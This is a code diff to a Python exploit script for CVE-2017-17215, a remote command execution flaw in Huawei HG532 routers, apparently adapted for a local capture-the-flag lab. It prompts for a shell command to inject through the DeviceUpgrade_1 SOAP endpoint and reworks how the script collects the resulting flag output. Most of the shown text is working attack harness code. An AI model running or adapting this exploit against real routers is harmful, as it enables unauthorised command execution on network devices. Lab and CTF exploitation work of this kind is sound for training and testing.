@@ -4,17 +4,17 @@ import time
 import requests
 from requests.auth import HTTPDigestAuth
 
-TARGET_URL = "http://127.0.0.1:37215/ctrlt/DeviceUpgrade_1"
-FLAG_HOST = "127.0.0.1"
-FLAG_PORT = 31337
+TARGET_HOST = "127.0.0.1"
+TARGET_PORT = 37215
+TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/ctrlt/DeviceUpgrade_1"
 headers = {'Content-Type': 'text/xml; charset="utf-8"'}
 ready_timeout = 40
 ready_interval = 2
-flag_timeout = 5
+flag_timeout = 8
 default_cmd = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/check_cache.sh >/tmp/flag_out"
 
 print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
-cmd = input(f"command [{default_cmd}] > ").strip() or default_cmd
+cmd = input(f"command [{default_cmd}] > " ).strip() or default_cmd
 
 data = f'''<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
@@ -53,19 +53,37 @@ def recv_flag():
 
     while time.time() < deadline:
         try:
-            with socket.create_connection((FLAG_HOST, FLAG_PORT), timeout=2) as sock:
+            with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=2) as sock:
                 sock.settimeout(2)
-                data = sock.recv(4096)
+                chunks = []
+
+                while True:
+                    try:
+                        chunk = sock.recv(4096)
+                    except socket.timeout:
+                        break
+                    if not chunk:
+                        break
+                    chunks.append(chunk)
+
+                data = b"".join(chunks)
                 if not data:
                     time.sleep(1)
                     continue
-                print("\nflag:\n" + data.decode(errors="replace").strip())
+
+                body_text = data.decode(errors="replace").strip()
+
+                if not body_text or body_text == "File not found." or body_text.startswith("<?xml") or "UpgradeResponse" in body_text:
+                    time.sleep(1)
+                    continue
+
+                print("\nflag:\n" + body_text)
                 return True
         except OSError as e:
             last_error = e
             time.sleep(1)
 
-    print("\n[*] flag port not ready:", last_error)
+    print("\n[*] flag not ready on 37215:", last_error)
     return False
 
 
